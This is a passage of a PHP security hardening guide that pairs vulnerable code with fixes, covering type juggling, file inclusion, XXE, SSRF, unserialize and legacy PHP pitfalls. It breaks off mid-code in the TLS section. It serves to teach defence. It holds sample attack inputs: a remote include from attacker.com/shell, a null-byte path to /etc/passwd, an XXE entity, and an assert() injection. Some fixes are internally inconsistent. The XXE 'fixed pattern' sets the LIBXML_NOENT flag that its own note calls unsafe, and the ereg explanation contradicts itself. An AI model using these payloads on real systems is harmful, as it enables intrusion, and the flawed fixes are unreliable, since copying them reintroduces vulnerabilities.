# PHP Application Security Hardening

**Non-obvious vulnerabilities in PHP applications ÔÇö what looks correct but silently fails**

> This guide focuses on mistakes that are genuinely easy to make: patterns copy-pasted from StackOverflow, mitigations that appear to work but don't, and security controls that fail silently under specific conditions. Basic advice like "use prepared statements" is included only where the common implementation of that advice is itself wrong.

---

## Table of Contents

1. [Universal PHP Security](#1-universal-php-security)
   - [Type Juggling and Loose Comparison](#type-juggling-and-loose-comparison)
   - [Variable Injection via extract()](#variable-injection-via-extract)
   - [Dynamic File Inclusion](#dynamic-file-inclusion)
   - [Host Header Injection](#host-header-injection)
   - [Open Redirect via header()](#open-redirect-via-header)
   - [Unrestricted File Upload](#unrestricted-file-upload)
   - [PHP Object Injection via unserialize()](#php-object-injection-via-unserialize)
   - [Error Disclosure in Production](#error-disclosure-in-production)
   - [The preg_replace /e Modifier](#the-preg_replace-e-modifier)
   - [Timing Attacks on Hash Comparison](#timing-attacks-on-hash-comparison)
   - [Null Byte Injection](#null-byte-injection)
   - [Session Fixation](#session-fixation)
   - [SSRF via HTTP Functions](#ssrf-via-http-functions)
   - [XXE via SimpleXML](#xxe-via-simplexml)
2. [Legacy PHP (5.x and Early 7.x)](#2-legacy-php-5x-and-early-7x)
   - [mysql_* Functions](#mysql_-functions)
   - [register_globals](#register_globals)
   - [magic_quotes_gpc](#magic_quotes_gpc)
   - [safe_mode](#safe_mode)
   - [ereg() Functions](#ereg-functions)
   - [Password Hashing Before PHP 5.5](#password-hashing-before-php-55)
   - [mcrypt Removed in PHP 7.2](#mcrypt-removed-in-php-72)
   - [assert() with String Argument](#assert-with-string-argument)
   - [TLS Peer Verification Defaults](#tls-peer-verification-defaults)
   - [unserialize() with Legacy Framework Gadget Chains](#unserialize-with-legacy-framework-gadget-chains)
3. [Laravel](#3-laravel)
   - [Mass Assignment](#mass-assignment)
   - [Raw SQL in Eloquent](#raw-sql-in-eloquent)
   - [Column Injection via orderBy](#column-injection-via-orderby)
   - [Unescaped Blade Output](#unescaped-blade-output)
   - [APP_DEBUG in Production](#app_debug-in-production)
   - [APP_KEY Leak](#app_key-leak)
   - [Telescope and Horizon Without Auth](#telescope-and-horizon-without-auth)
   - [SSRF via Http::get()](#ssrf-via-httpget)
   - [storage:link Misconfiguration](#storagelink-misconfiguration)
   - [Queue Job Deserialization](#queue-job-deserialization)
   - [Web Root Not Set to public/](#web-root-not-set-to-public)
   - [Signed URL Expiry Misuse](#signed-url-expiry-misuse)
   - [Laravel 5.x mcrypt Dependency](#laravel-5x-mcrypt-dependency)
   - [Rate Limiting Not Default in Laravel 6.x and Below](#rate-limiting-not-default-in-laravel-6x-and-below)
   - [request()->merge() Feeding create()](#requestmerge-feeding-create)
4. [Symfony](#4-symfony)
   - [Twig raw Filter](#twig-raw-filter)
   - [Web Debug Toolbar in Production](#web-debug-toolbar-in-production)
   - [Doctrine DQL Without Sanitization](#doctrine-dql-without-sanitization)
   - [YAML Object Deserialization](#yaml-object-deserialization)
   - [Firewall Ordering](#firewall-ordering)
   - [access_control Case Sensitivity](#access_control-case-sensitivity)
   - [Security Component Without Bundle](#security-component-without-bundle)
5. [CodeIgniter](#5-codeigniter)
   - [CSRF Off by Default in CI 2.x](#csrf-off-by-default-in-ci-2x)
   - [Raw Query Strings in CI 2.x/3.x](#raw-query-strings-in-ci-2x3x)
   - [Column Injection in CI 3.x Active Record](#column-injection-in-ci-3x-active-record)
   - [Upload Class Extension-Only Check](#upload-class-extension-only-check)
   - [xss_clean Deprecation in CI 4](#xss_clean-deprecation-in-ci-4)
   - [Encryption Key Exposure in CI 2.x](#encryption-key-exposure-in-ci-2x)
   - [CI 3.x Patterns That Break Silently in CI 4](#ci-3x-patterns-that-break-silently-in-ci-4)
   - [allowed_hosts Not Configured in CI 4](#allowed_hosts-not-configured-in-ci-4)
6. [Phalcon](#6-phalcon)
   - [Volt raw Blocks](#volt-raw-blocks)
   - [PHQL Injection](#phql-injection)
   - [bcrypt Cost Factor](#bcrypt-cost-factor)
   - [User-Controlled Cache Keys](#user-controlled-cache-keys)
7. [Pure PHP (No Framework)](#7-pure-php-no-framework)
   - [HTML Templating by String Concatenation](#html-templating-by-string-concatenation)
   - [include Routing](#include-routing)
   - [Manual Session Handling](#manual-session-handling)
   - [Prepared Statement Patterns](#prepared-statement-patterns)
   - [Password Hashing](#password-hashing)
   - [Direct File Operations](#direct-file-operations)

---

## 1. Universal PHP Security

> **Applies to:** All PHP applications regardless of version or framework.
> **Quick detect:** Any `.php` file.
> **These apply everywhere.** Framework-specific items follow in later sections.

---

### Type Juggling and Loose Comparison

**Vulnerable pattern:**

```php
// Authentication check using ==
if ($userHash == $storedHash) {
    // authenticated
}

// Or: comparing a known MD5 hash
$hash = md5($password);
if ($hash == "0e462097431906509019562988736854") {
    // this matches ANY hash beginning with 0e followed by digits
}
```

**Why it fails:**

PHP's `==` operator performs type juggling. When both sides of a comparison look like numbers, PHP converts them to numbers before comparing. Hashes that match the pattern `0e[0-9]+` are interpreted as scientific notation (0 ├ù 10^n = 0). Two completely different values whose MD5 or SHA1 hashes both start with `0e` followed by digits will compare as equal with `==`.

Known "magic" hash collisions include:

```
md5("240610708")  = 0e462097431906509019562988736854
md5("QNKCDZO")   = 0e830400451993494058024219903391
sha1("aaroZmOk") = 0e66507019969427134894567494305185566735
```

Any of these strings will bypass a `==` check against the other.

**Fixed pattern:**

```php
// Always use === for hash comparison
if ($userHash === $storedHash) {
    // authenticated
}

// Better: use hash_equals() which also prevents timing attacks
if (hash_equals($storedHash, $userHash)) {
    // authenticated
}
```

> **Note:** This also affects integer comparisons. `"1e1" == "10"` is true in PHP. Never use `==` to validate that user input matches a specific string or number unless you have first confirmed both sides are the same type.

---

### Variable Injection via extract()

**Vulnerable pattern:**

```php
extract($_POST);
extract($_GET);
extract($_REQUEST);

// Now $_POST['isAdmin'] = '1' has become $isAdmin = '1'
if ($isAdmin) {
    // attacker gets here
}
```

**Why it fails:**

`extract()` takes an associative array and creates a local variable for each key. Calling it on `$_POST` or `$_GET` allows an attacker to overwrite any local variable the script uses, including authentication flags, file paths, configuration values, and SQL fragments.

**Fixed pattern:**

```php
// Option 1: access individual keys explicitly
$username = $_POST['username'] ?? '';
$password = $_POST['password'] ?? '';

// Option 2: if extract() is genuinely needed, use EXTR_SKIP to
// avoid overwriting existing variables, and filter keys first
$allowed = ['theme', 'language', 'timezone'];
$safe = array_intersect_key($_POST, array_flip($allowed));
extract($safe, EXTR_SKIP);
```

---

### Dynamic File Inclusion

**Vulnerable pattern:**

```php
// PHP routing by GET parameter
include($_GET['page'] . '.php');
require($_GET['template']);

// With allow_url_include = On (or On by default in PHP < 5.2):
// ?page=http://attacker.com/shell
// results in remote code execution
```

**Why it fails:**

`include` and `require` accept URLs if `allow_url_include` is enabled (it is Off by default since PHP 5.2, but may be On in legacy or misconfigured environments). Even with `allow_url_include = Off`, local file inclusion via `../` path traversal is possible, allowing an attacker to include any file readable by the PHP process ÔÇö including `/etc/passwd`, log files containing injected PHP code, or uploaded files with a `.jpg` extension that contain PHP.

**Fixed pattern:**

```php
// Allowlist approach: only permit known page names
$allowed_pages = ['home', 'about', 'contact'];
$page = $_GET['page'] ?? 'home';

if (!in_array($page, $allowed_pages, true)) {
    $page = 'home';
}

include __DIR__ . '/pages/' . $page . '.php';
```

```ini
; php.ini ÔÇö ensure this is Off
allow_url_include = Off
allow_url_fopen = Off  ; also disables file_get_contents('http://...')
```

---

### Host Header Injection

**Vulnerable pattern:**

```php
// Password reset email generation
$resetLink = 'http://' . $_SERVER['HTTP_HOST'] . '/reset?token=' . $token;
mail($email, 'Reset your password', 'Click here: ' . $resetLink);
```

**Why it fails:**

`$_SERVER['HTTP_HOST']` is taken directly from the HTTP `Host:` request header, which the attacker controls. A request with `Host: attacker.com` will produce a reset link pointing to `attacker.com`. The victim clicks a link in a legitimate email and their reset token is sent to the attacker's server.

**Fixed pattern:**

```php
// Option 1: hardcode the application URL from configuration
define('APP_URL', 'https://yourapp.example.com');
$resetLink = APP_URL . '/reset?token=' . $token;

// Option 2: validate HTTP_HOST against an allowlist
$allowedHosts = ['yourapp.example.com', 'www.yourapp.example.com'];
$host = $_SERVER['HTTP_HOST'] ?? '';
if (!in_array($host, $allowedHosts, true)) {
    http_response_code(400);
    exit('Invalid host');
}
$resetLink = 'https://' . $host . '/reset?token=' . $token;
```

---

### Open Redirect via header()

**Vulnerable pattern:**

```php
// After login, redirect to the originally requested page
header("Location: " . $_GET['next']);
exit;

// Injection via newline ÔÇö injects arbitrary headers
// ?next=%0d%0aSet-Cookie:+session=attacker_value
header("Location: /dashboard\r\nSet-Cookie: session=hijacked");
```

**Why it fails:**

Without URL validation, an attacker can redirect users to any site (`?next=https://phishing.example.com`). Additionally, in PHP versions before 7.3, `header()` did not strip newline characters, enabling header injection ÔÇö an attacker could inject `\r\n` to add arbitrary HTTP headers, including cookies or cache-control directives.

**Fixed pattern:**

```php
function safe_redirect(string $url, array $allowedHosts): void {
    $parsed = parse_url($url);

    // Relative paths only, OR validate host against allowlist
    if (!isset($parsed['host'])) {
        // relative URL ÔÇö safe, but normalize to prevent protocol-relative //attacker.com
        if (strpos($url, '//') === 0) {
            $url = '/';
        }
    } elseif (!in_array($parsed['host'], $allowedHosts, true)) {
        $url = '/';
    }

    header("Location: " . $url, true, 302);
    exit;
}

safe_redirect($_GET['next'] ?? '/', ['yourapp.example.com']);
```

---

### Unrestricted File Upload

**Vulnerable pattern:**

```php
// Check file extension only
$ext = pathinfo($_FILES['upload']['name'], PATHINFO_EXTENSION);
if (in_array(strtolower($ext), ['jpg', 'png', 'gif'])) {
    move_uploaded_file($_FILES['upload']['tmp_name'], 'uploads/' . $_FILES['upload']['name']);
}

// Or: check the MIME type from the request header
// $_FILES['upload']['type'] is sent by the browser and is fully attacker-controlled
if ($_FILES['upload']['type'] === 'image/jpeg') {
    // does not prevent a PHP file with a .jpg extension
}
```

**Why it fails:**

File extensions are trivially forged. A file named `shell.php.jpg` may pass an extension check depending on how the check is implemented. The `$_FILES['type']` field is sent by the HTTP client and is not validated by PHP ÔÇö an attacker can send any MIME type. A file with `.php` content and a `.jpg` extension will execute as PHP if the web server is configured to process `.php` files by extension match rather than by inspecting the file.

**Fixed pattern:**

```php
// Detect actual file content using fileinfo extension
$finfo = new finfo(FILEINFO_MIME_TYPE);
$mimeType = $finfo->file($_FILES['upload']['tmp_name']);

$allowedMimeTypes = ['image/jpeg', 'image/png', 'image/gif', 'image/webp'];
if (!in_array($mimeType, $allowedMimeTypes, true)) {
    die('Invalid file type');
}

// Generate a random filename ÔÇö never use the user-supplied name
$ext = match($mimeType) {
    'image/jpeg' => 'jpg',
    'image/png'  => 'png',
    'image/gif'  => 'gif',
    'image/webp' => 'webp',
};
$filename = bin2hex(random_bytes(16)) . '.' . $ext;
move_uploaded_file($_FILES['upload']['tmp_name'], '/var/uploads/' . $filename);
```

> **Note:** Store uploaded files outside the web root, or configure Nginx/Apache to never execute files in the upload directory. Even a correct MIME check can be bypassed by polyglot files (files that are simultaneously valid images and valid PHP). Execution prevention at the server layer is the real control.

---

### PHP Object Injection via unserialize()

**Vulnerable pattern:**

```php
// Restoring user preferences from a cookie
$prefs = unserialize(base64_decode($_COOKIE['preferences']));

// Or from a POST field:
$data = unserialize($_POST['object_data']);
```

**Why it fails:**

PHP's `unserialize()` instantiates objects of any class that has been loaded, calling `__wakeup()` and `__destruct()` magic methods during the process. If the application (or any of its dependencies ÔÇö including Symfony, Guzzle, Doctrine, monolog, etc.) contains a class with a `__destruct()` or `__wakeup()` method that does something dangerous (writes files, executes commands, makes HTTP requests), an attacker can craft a serialized payload that chains those methods to achieve remote code execution. This attack class is called "property-oriented programming" (POP) and documented gadget chains exist for every major PHP framework.

**Fixed pattern:**

```php
// Use JSON for data transport ÔÇö no object instantiation
$prefs = json_decode(base64_decode($_COOKIE['preferences']), true);

// If unserialize() is unavoidable (e.g., legacy code or PHP sessions),
// use the allowed_classes option (PHP 7.0+) to restrict which classes
// can be instantiated:
$data = unserialize($input, ['allowed_classes' => false]);
// allowed_classes: false means only scalars and arrays ÔÇö no objects
```

> **Warning:** `allowed_classes: false` prevents object injection but also means you cannot restore custom objects. Any code path that feeds user-controlled data to `unserialize()` should be treated as a critical vulnerability until proven otherwise. Serialization gadget chains do not require the application's own code to be vulnerable ÔÇö any dependency with a suitable magic method is sufficient.

---

### Error Disclosure in Production

**Vulnerable pattern:**

```ini
; php.ini or php-fpm pool config
display_errors = On
display_startup_errors = On
error_reporting = E_ALL
```

**Why it fails:**

PHP errors and stack traces expose: absolute file system paths, database server hostname and port, database names, usernames, partial queries (revealing table and column names), PHP version, loaded extensions, and sometimes environment variable values if they appear in an error context.

**Fixed pattern:**

```ini
; php.ini ÔÇö production settings
display_errors = Off
display_startup_errors = Off
log_errors = On
error_log = /var/log/php/error.log
error_reporting = E_ALL  ; still log everything, just don't display it
```

```php
// In application code: catch exceptions and log without exposing details
set_exception_handler(function (Throwable $e) {
    error_log($e->getMessage() . ' in ' . $e->getFile() . ':' . $e->getLine());
    http_response_code(500);
    echo 'An error occurred. Please try again later.';
    exit;
});
```

---

### The preg_replace /e Modifier

**Vulnerable pattern:**

```php
// Old code ÔÇö the /e modifier evaluates the replacement as PHP
$output = preg_replace('/(.*)/e', strtoupper('\\1'), $input);

// With user-controlled input in the replacement string:
preg_replace('/(' . $pattern . ')/e', $replacement, $content);
```

**Why it fails:**

The `/e` modifier in `preg_replace()` caused PHP to evaluate the replacement string as PHP code after performing substitutions. This was removed in PHP 7.0, but legacy codebases on PHP 5.x still have it, and code copied from pre-7.0 tutorials still uses it. Any user-controlled input in the replacement or pattern parameter is code execution.

**Fixed pattern:**

```php
// Use preg_replace_callback() instead ÔÇö no code evaluation
$output = preg_replace_callback('/(.*)/', function ($matches) {
    return strtoupper($matches[1]);
}, $input);
```

> **Note:** The `/e` modifier is a compile-time syntax error in PHP 7.0 and above. If your test environment runs PHP 7+ but production runs PHP 5.x, the vulnerability will not surface in testing.

---

### Timing Attacks on Hash Comparison

**Vulnerable pattern:**

```php
if ($computedHmac == $receivedHmac) { }
if ($storedToken === $submittedToken) { }
```

**Why it fails:**

String comparison in PHP (both `==` and `===`) short-circuits on the first differing character. An attacker who can measure response time precisely enough can determine how many leading characters of their guess are correct, then iterate one character at a time to brute-force a token or HMAC. This is practical for tokens that are compared in a tight loop or against a fast API.

**Fixed pattern:**

```php
// hash_equals() uses constant-time comparison
if (hash_equals($storedToken, $submittedToken)) {
    // safe
}

// For HMAC validation:
if (hash_equals(
    hash_hmac('sha256', $payload, $secret),
    $receivedHmac
)) {
    // safe
}
```

> **Note:** `hash_equals()` requires both arguments to be the same type (string). It was added in PHP 5.6. For PHP 5.5 and below, see the [Legacy PHP section](#2-legacy-php-5x-and-early-7x).

---

### Null Byte Injection

**Vulnerable pattern:**

```php
// Extension check on file path
$filename = $_GET['file'];
if (substr($filename, -4) === '.jpg') {
    readfile('/var/uploads/' . $filename);
}

// Request: ?file=../etc/passwd%00.jpg
// substr('../etc/passwd\0.jpg', -4) === '.jpg' ÔåÆ true
// But is_file() and open() stop at the null byte
// Result: /etc/passwd is read
```

**Why it fails:**

Null byte (`%00`, `\0`) terminates C strings. PHP's file functions (`fopen`, `file_get_contents`, `readfile`) are implemented in C and pass the path to the OS as a C string, where the null byte acts as a string terminator. A file check at the PHP level sees the full string including `.jpg`, but the OS sees only the part before `\0`.

**Fixed pattern:**

```php
// PHP 5.3.4+ rejects null bytes in file function arguments by default.
// For older PHP, explicitly strip null bytes:
$filename = str_replace("\0", '', $_GET['file']);

// Better: use a basename-only check and enforce it
$filename = basename($_GET['file']);  // strip any path components
if (!preg_match('/^[a-zA-Z0-9_\-]+\.jpg$/', $filename)) {
    http_response_code(400);
    exit;
}
readfile('/var/uploads/' . $filename);
```

---

### Session Fixation

**Vulnerable pattern:**

```php
// Accepting session ID from URL parameter
// php.ini: session.use_only_cookies = 0
// php.ini: session.use_trans_sid = 1

session_start();
// Attacker sends victim a link: https://app.example.com/?PHPSESSID=attackerknownvalue
// When victim logs in, the session is now authenticated with the attacker's known ID
```

**Why it fails:**

If `session.use_only_cookies` is Off, PHP accepts session IDs from URL parameters (`?PHPSESSID=xxx`). An attacker who knows a session ID can send the victim a URL with that ID embedded. When the victim authenticates, the session ÔÇö which the attacker already knows ÔÇö becomes an authenticated session.

**Fixed pattern:**

```ini
; php.ini
session.use_only_cookies = 1
session.use_trans_sid = 0
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Lax
```

```php
// Regenerate session ID on privilege escalation (login, role change)
session_start();
session_regenerate_id(true);  // true = delete the old session file
$_SESSION['user_id'] = $authenticatedUserId;
```

---

### SSRF via HTTP Functions

**Vulnerable pattern:**

```php
// Fetching a user-provided URL
$content = file_get_contents($_GET['url']);

// Or via cURL:
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $_POST['webhook_url']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
```

**Why it fails:**

Server-Side Request Forgery allows an attacker to make the server issue HTTP requests to internal services that are not publicly accessible: cloud metadata endpoints (`169.254.169.254`), internal APIs (`10.0.0.x`), localhost services (Redis, Memcached, internal admin panels), and file system paths if `file://` is not blocked.

**Fixed pattern:**

```php
function safe_fetch(string $url): string {
    $parsed = parse_url($url);

    // Restrict to https only
    if (!in_array($parsed['scheme'] ?? '', ['https', 'http'], true)) {
        throw new InvalidArgumentException('Only HTTP(S) allowed');
    }

    // Resolve to IP and check against private ranges
    $ip = gethostbyname($parsed['host']);
    if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) === false) {
        throw new InvalidArgumentException('Private/reserved IP addresses are not allowed');
    }

    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_TIMEOUT        => 10,
        CURLOPT_PROTOCOLS      => CURLPROTO_HTTPS | CURLPROTO_HTTP,
        CURLOPT_REDIR_PROTOCOLS => CURLPROTO_HTTPS,
    ]);
    return curl_exec($ch);
}
```

> **Warning:** DNS-based SSRF bypass (DNS rebinding) is possible: `gethostbyname()` resolves the host at check time, but the actual connection resolves again. A DNS entry that returns a public IP during the check and a private IP during the request can bypass this validation. For full protection, use a network-level egress firewall that blocks RFC 1918 addresses from the PHP server.

---

### XXE via SimpleXML

**Vulnerable pattern:**

```php
// Parsing user-provided XML
$xml = simplexml_load_string($_POST['xml_data']);

// With payload: <?xml version="1.0"?>
// <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
// <root>&xxe;</root>
// PHP will read /etc/passwd and include it in the parsed XML
```

**Why it fails:**

XML external entities (XXE) allow the XML parser to include content from external files or URLs. By default, PHP's libxml resolves external entities, meaning user-supplied XML can read arbitrary files, make HTTP requests to internal services (SSRF), or cause denial of service via entity expansion (billion laughs attack).

**Fixed pattern:**

```php
// Disable external entity loading before parsing
libxml_set_external_entity_loader(null);  // PHP 8.0+

// For older PHP: use LIBXML_NONET to prevent network access,
// and LIBXML_NOENT to NOT substitute entities (counter-intuitive name)
$xml = simplexml_load_string(
    $userXml,
    'SimpleXMLElement',
    LIBXML_NONET | LIBXML_DTDATTR | LIBXML_NOENT
);

// Or disable globally at the start of the request:
libxml_disable_entity_loader(true);  // deprecated in PHP 8.0, but works in 7.x
$xml = simplexml_load_string($userXml);
```

> **Note:** `LIBXML_NOENT` is one of the most confusingly named constants in PHP. Despite the name, setting it actually causes entities to be substituted (expanded), which is the *unsafe* behavior. Do NOT set `LIBXML_NOENT` ÔÇö omit it or explicitly unset it. The safe flags are `LIBXML_NONET` (no network) and `libxml_set_external_entity_loader(null)` (no file or network external entities).

---

## 2. Legacy PHP (5.x and Early 7.x)

> **Applies to:** Applications running PHP 5.x or PHP 7.0ÔÇô7.2.
> **Quick detect:**
> ```bash
> php -v
> # or inside Docker:
> docker exec CONTAINER php -v
> ```
> **Not on legacy PHP?** Skip to [Laravel](#3-laravel) or your framework section.

> **If you cannot upgrade yet:** These mitigations reduce risk without requiring a PHP version change. None are substitutes for upgrading, but they address the highest-impact issues in place.

---

### mysql_* Functions

**Vulnerable pattern:**

```php
$result = mysql_query("SELECT * FROM users WHERE name = '" . $_POST['name'] . "'");
```

**Why it fails:**

The `mysql_*` extension (deprecated in PHP 5.5, removed in PHP 7.0) has no prepared statement support. Every query must be constructed by string concatenation, and the only escaping function ÔÇö `mysql_real_escape_string()` ÔÇö is easily bypassed with multi-byte character set attacks (specifically, with GBK or similar encodings where the escaping backslash can be consumed as part of a multi-byte character).

**Fixed pattern ÔÇö if you can migrate:**

```php
// PDO with prepared statements
$pdo = new PDO('mysql:host=localhost;dbname=app;charset=utf8mb4', $user, $pass, [
    PDO::ATTR_EMULATE_PREPARES => false,  // use real server-side prepared statements
]);
$stmt = $pdo->prepare('SELECT * FROM users WHERE name = :name');
$stmt->execute([':name' => $_POST['name']]);
$rows = $stmt->fetchAll(PDO::FETCH_ASSOC);
```

**If you cannot upgrade (PHP 5.x with mysql_* still in use):**

```php
// Set charset explicitly before any queries ÔÇö reduces multi-byte escape bypass risk
mysql_set_charset('utf8', $conn);

// Use mysql_real_escape_string() ÔÇö not perfect but better than nothing
$name = mysql_real_escape_string($_POST['name'], $conn);
$result = mysql_query("SELECT * FROM users WHERE name = '" . $name . "'");

// Never omit the connection argument to mysql_real_escape_string()
// Without it, the function uses the last opened connection,
// which may have a different character set than expected
```

---

### register_globals

**Vulnerable pattern:**

```ini
; php.ini
register_globals = On
```

```php
// With register_globals On, all GET/POST/COOKIE/SERVER values
// become global PHP variables automatically
// ?admin=1 ÔåÆ $admin = '1'
if ($admin) {
    show_admin_panel();
}
```

**Why it fails:**

`register_globals` was removed in PHP 5.4. It automatically imported all request parameters as global variables before script execution, allowing any GET/POST parameter to overwrite any uninitialized variable in the script.

**Mitigation if stuck on PHP 5.3 or earlier:**

```php
// At the top of every script, explicitly initialize all variables
$admin = false;
$userId = 0;
$isAuthenticated = false;

// Then read from superglobals explicitly
$userId = (int) ($_POST['user_id'] ?? 0);
```

```ini
; Disable in php.ini
register_globals = Off
```

---

### magic_quotes_gpc

**Vulnerable pattern:**

```ini
; php.ini
magic_quotes_gpc = On
```

```php
// The problem: with magic_quotes_gpc On, all GET/POST/COOKIE input
// is automatically escaped with addslashes(). Developers then also
// call mysql_real_escape_string(), resulting in double-escaped data.
// Stored in DB: O\'Brien (with visible backslash-apostrophe)
// OR: developers disable their own escaping, relying on magic_quotes
// which uses addslashes() ÔÇö not the charset-aware escaping of mysql_real_escape_string()
```

**Why it fails:**

`magic_quotes_gpc` was removed in PHP 5.4. It created two categories of broken code: code that double-escaped input (storing `O\'Brien` in the database), and code that disabled explicit escaping and relied solely on magic quotes ÔÇö which was always less safe than `mysql_real_escape_string()`. Neither pattern is correct.

**Mitigation if stuck on PHP 5.3 or earlier:**

```php
// Strip magic quotes at the start of the request
function strip_magic_quotes(mixed $value): mixed {
    if (is_array($value)) {
        return array_map('strip_magic_quotes', $value);
    }
    return get_magic_quotes_gpc() ? stripslashes($value) : $value;
}

$_GET    = strip_magic_quotes($_GET);
$_POST   = strip_magic_quotes($_POST);
$_COOKIE = strip_magic_quotes($_COOKIE);
// Then do your own proper escaping on every query
```

---

### safe_mode

> **Note:** `safe_mode` was removed in PHP 5.4. If you are running a PHP version that still has it, the entire system is unsupported and should be considered end-of-life.

**Why it fails:**

`safe_mode` was never a real security boundary. It restricted only some file operations based on owner UID matching ÔÇö it did not prevent SQL injection, XSS, object injection, or any of the application-layer vulnerabilities that actually get sites compromised. The PHP developers acknowledged this and removed it. Any security posture that lists `safe_mode = On` as a control should be treated as having no meaningful application-layer security.

**Mitigation:** Upgrade PHP. There is no safe mode equivalent that provides real security. Use OS-level file permissions, separate user accounts per application, and application-level input validation.

---

### ereg() Functions

**Vulnerable pattern:**

```php
// Validating file extension with ereg
if (ereg('\.jpg$', $_GET['filename'])) {
    include('/uploads/' . $_GET['filename']);
}
```

**Why it fails:**

The POSIX `ereg()` function family (deprecated in PHP 5.3, removed in PHP 7.0) stopped processing at null bytes, just like C string functions. A filename like `shell.php\0.jpg` would pass the `\.jpg$` check because `ereg()` sees only `shell.php` before the null byte, which does not match, but wait ÔÇö the termination means `ereg()` never sees `.jpg` either. The behavior was implementation-specific and inconsistent, making it unreliable as a security control.

**Fixed pattern:**

```php
// Use preg_match() ÔÇö PCRE handles null bytes predictably
if (preg_match('/^[a-zA-Z0-9_\-]+\.jpg$/D', $_GET['filename'])) {
    // The /D modifier prevents $ from matching before \n
    // which is another ereg bypass variant
    include('/uploads/' . $_GET['filename']);
}
```

---

### Password Hashing Before PHP 5.5

**Vulnerable pattern:**

```php
// Common in pre-2013 PHP code
$hash = md5($password);
$hash = sha1($password);
$hash = md5(md5($password));
$hash = md5($password . $salt);  // slightly better, still wrong
```

**Why it fails:**

MD5 and SHA1 are fast cryptographic hash functions. Fast is the opposite of what you want for password hashing. A modern GPU can compute billions of MD5 hashes per second, meaning a leaked database can be brute-forced in hours. `password_hash()` (added in PHP 5.5) uses bcrypt by default, which is intentionally slow and includes a per-password salt.

**If you can use PHP 5.5+:**

```php
// Hashing
$hash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);

// Verification
if (password_verify($password, $hash)) {
    // correct password
}

// Check if hash needs rehashing (cost factor was increased)
if (password_needs_rehash($hash, PASSWORD_BCRYPT, ['cost' => 12])) {
    $newHash = password_hash($password, PASSWORD_BCRYPT, ['cost' => 12]);
    // save $newHash to database
}
```

**If stuck on PHP 5.3ÔÇô5.4:**

```php
// Use the password_compat library (https://github.com/ircmaxell/password_compat)
// It polyfills password_hash() and password_verify() for PHP 5.3.7+
require 'password.php';
$hash = password_hash($password, PASSWORD_BCRYPT);
```

---

### mcrypt Removed in PHP 7.2

**Vulnerable pattern:**

```php
// Code that used mcrypt ÔÇö deprecated PHP 7.1, removed PHP 7.2
$encrypted = mcrypt_encrypt(MCRYPT_RIJNDAEL_256, $key, $data, MCRYPT_MODE_CBC, $iv);
$decrypted = mcrypt_decrypt(MCRYPT_RIJNDAEL_256, $key, $encrypted, MCRYPT_MODE_CBC, $iv);
```

**Why it fails two ways:**

First, mcrypt was removed in PHP 7.2, so this code silently stops working ÔÇö no error in some configurations, fatal error in others depending on extension loading. Second, the mcrypt implementation of Rijndael-256 is not the same as AES-256. AES uses a 128-bit block size; `MCRYPT_RIJNDAEL_256` uses a 256-bit block size. Code "upgraded" to use OpenSSL by replacing `MCRYPT_RIJNDAEL_256` with `aes-256-cbc` will silently produce different ciphertext and fail to decrypt data encrypted with the old code.

**Fixed pattern:**

```php
// Use OpenSSL ÔÇö available in all modern PHP versions
function encrypt(string $plaintext, string $key): string {
    $iv = random_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $ciphertext = openssl_encrypt($plaintext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
    return base64_encode($iv . $ciphertext);
}

function decrypt(string $encoded, string $key): string {
    $data = base64_decode($encoded);
    $ivLen = openssl_cipher_iv_length('aes-256-cbc');
    $iv = substr($data, 0, $ivLen);
    $ciphertext = substr($data, $ivLen);
    return openssl_decrypt($ciphertext, 'aes-256-cbc', $key, OPENSSL_RAW_DATA, $iv);
}
```

> **Note:** If you have data encrypted with mcrypt that you need to migrate, decrypt it with a PHP 7.1 environment (the last version that had mcrypt) before upgrading, then re-encrypt with OpenSSL. There is no clean in-place migration path.

---

### assert() with String Argument

**Vulnerable pattern:**

```php
// assert() with a string argument evaluates it as PHP code
assert('is_numeric(' . $_GET['value'] . ')');

// Attacker sends: ?value=1)+var_dump(file_get_contents('/etc/passwd'));//
// Evaluated: is_numeric(1)+var_dump(file_get_contents('/etc/passwd'));//)
// Result: arbitrary code execution
```

**Why it fails:**

When `assert()` receives a string in PHP 5.x and 7.x, it evaluates the string as PHP code (equivalent to `eval()`). This was deprecated in PHP 7.2 and removed in PHP 8.0. Legacy code that uses `assert()` for runtime checks with any user-controlled data is a code execution vulnerability.

**Fixed pattern:**

```php
// Pass a boolean expression directly ÔÇö never a string
assert(is_numeric($value));

// Or use explicit validation
if (!is_numeric($value)) {
    throw new InvalidArgumentException('Expected numeric value');
}
```

```ini
; php.ini ÔÇö disable string assert evaluation (PHP 7.x)
assert.active = 0
; Or: zend.assertions = -1  (disables assert() entirely in production)
```

---

### TLS Peer Verification Defaults

**Vulnerable pattern:**

```php
// PHP versions before 5.6: cURL did not verify SSL certificates by default
// Code copy-pasted from old tutorials explicitly disables verification:
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);

// Also: stream_context_create without ssl options
$context = stream_context_create(['http' => ['method' => 'GET']]);
// PHP < 5.6: does not verify SSL cert for https:// URLs
```

**Why it fails:**

PHP 5.6 introduced peer verification by default. Before that, `file_get_contents('https://...')` and cURL with default settings did not verify the server's SSL certificate, making all HTTPS requests vulnerable to man-in-the-middle attacks. Code with explicit `CURLOPT_SSL_VERIFYPEER => false` ÔÇö often added to "fix" certificate errors in development ÔÇö disables this protection entirely even on PHP 5.6+.

**Fixed pattern:**

```php
$ch = curl_init($url);
curl_setopt_array($ch, [
    CURLOPT_RETURNTRANSFER  => true,
    CURLOPT_SSL_VERIFYPEER  => true,   // verify server certificate
    CURLOPT_SSL_VERIFYHOST  => 2,      // verify hostname matches cert (2 = strict)
    CURLOPT_CAINFO          => '/etc/ssl/certs/ca-certificates.crt',
]);

// For file_get_contents with HTTPS:
$context = stream_context_create([
    'ssl' => [
        'verify_peer'       => true,
